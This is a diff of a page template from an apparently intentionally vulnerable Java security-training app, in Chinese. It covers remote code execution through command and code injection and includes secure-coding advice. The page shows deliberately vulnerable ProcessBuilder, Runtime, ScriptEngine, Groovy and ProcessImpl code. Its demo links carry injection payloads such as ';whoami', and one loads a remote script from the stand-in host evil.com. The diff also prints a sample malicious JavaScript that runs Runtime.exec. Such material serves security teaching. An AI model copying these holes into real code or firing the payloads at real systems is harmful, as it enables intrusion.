@@ -17,13 +17,23 @@
                 <a class="btn btn-sm btn-primary" target="_blank" href="">漏洞案例</a>
             </div>
             <hr>
-            <div class="dec shadow-sm p-3 mb-4  rounded">RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:<br>
-                - 命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入<br>
-                - 代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。
-            </div>
+            <ul class="nav nav-tabs">
+                <li class="nav-item">
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
+                </li>
+            </ul>
 
-            <h5><span class="lnr lnr-bullhorn"> 编码建议</span></h5>
-            <textarea disabled="disabled" class="form-control p-2 mb-5 rounded" id="coder">
+            <div class="tab-content">
+                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
+                    RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:<br><br>
+                    命令注入（Command Injection），在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入<br>
+                    代码注入（Code Injection），在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。
+                </div>
+                <div class="tab-pane fade" id="bb">
+                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 230px;">
 【建议】避免不可信数据拼接操作系统命令
  当不可信数据存在时，应尽量避免外部数据拼接到操作系统命令使用 Runtime 和 ProcessBuilder 来执行。优先使用其他同类操作进行代替，比如通过文件系统API进行文件操作而非直接调用操作系统命令。
 
@@ -31,13 +41,16 @@
  禁止外部数据直接直接作为操作系统命令执行。
  避免通过"cmd"、“bash”、“sh”等命令创建shell后拼接外部数据来执行操作系统命令。
  对外部传入数据进行过滤。可通过白名单限制字符类型，仅允许字符、数字、下划线；或过滤转义以下符号：|;&$><`（反引号）!
-            </textarea>
+                    </textarea>
+                </div>
+            </div>
+
             <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/ProcessBuilder?filepath=/tmp;whoami}">运行</a>
+                       th:href="@{/RCE/ProcessBuilder/vul?filepath=/tmp;whoami}">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessBuilder方式</span></h5>
 
                     <textarea class="form-control" id="code1">
@@ -54,7 +67,7 @@ public static String cmd(String filepath) {
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/runtime?cmd=id}">运行</a>
+                       th:href="@{/RCE/Runtime/vul?cmd=id}">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Runtime方式</span></h5>
                     <textarea class="form-control" id="code2">
 // getRuntime()常用于执行本地命令，使用频率较高。
@@ -71,23 +84,23 @@ public static String cmd2(String cmd) {
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/RCE/js?url=http://evil.com/java/1.js}">运行</a>
-                    <h5><span class="lnr lnr-bug"> 漏洞代码 - 远程加载JS</span></h5>
+                       th:href="@{/RCE/ScriptEngine/vul?url=http://evil.com/java/1.js}">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - 脚本引擎代码注入</span></h5>
                     <textarea class="form-control" id="code3">
-// 通过加载远程js文件来执行代码，如果加载了恶意js则会造成任意命令执行。
+// 通过加载远程js文件来执行代码，如果加载了恶意js则会造成任意命令执行
 // 远程恶意js: var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
+// ⚠️ 在Java 8之后移除了ScriptEngineManager的eval
 
-@GetMapping("/js")
 public void jsEngine(String url) throws Exception {
     ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
     Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
     String payload = String.format("load('%s')", url);
-    System.out.println(payload);
     engine.eval(payload, bindings);
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" href="/RCE/groovy?cmd='open -a Calculator'.execute()">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="/RCE/Groovy/vul?cmd='open -a Calculator'.execute()">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Groovy执行命令</span></h5>
                     <textarea class="form-control" id="code4">
 // 不安全的使用Groovy调用命令
@@ -98,14 +111,26 @@ public void groovy(String cmd) {
     GroovyShell shell = new GroovyShell();
     shell.evaluate(cmd);
 }
-                    </textarea>
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-danger" href="/RCE/ProcessImpl/vul?cmd=id">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessImpl</span></h5>
+                    <textarea class="form-control" id="code5">
+// ProcessImpl是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类
+
+Class clazz = Class.forName("java.lang.ProcessImpl");
+Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
+method.setAccessible(true);
+method.invoke(null, new String[]{cmd}, null, null, null, false);
+                    </textarea><br><br>
+
                 </div>
 
                 <div class="float2">
                     <a style="float:right" class="btn btn-sm btn-success"
                        th:href="@{/RCE/ProcessBuilder/safe?filepath=/tmp;whoami}">运行</a>
                     <h5><span class="lnr lnr-smile"> 安全代码 - 过滤特殊字符</span></h5>
-                    <textarea class="form-control" id="code5">
+                    <textarea class="form-control" id="code6">
 // 自定义黑名单，这里过滤了常见的管道符，可自行添加
 
 public static boolean checkOs(String content) {
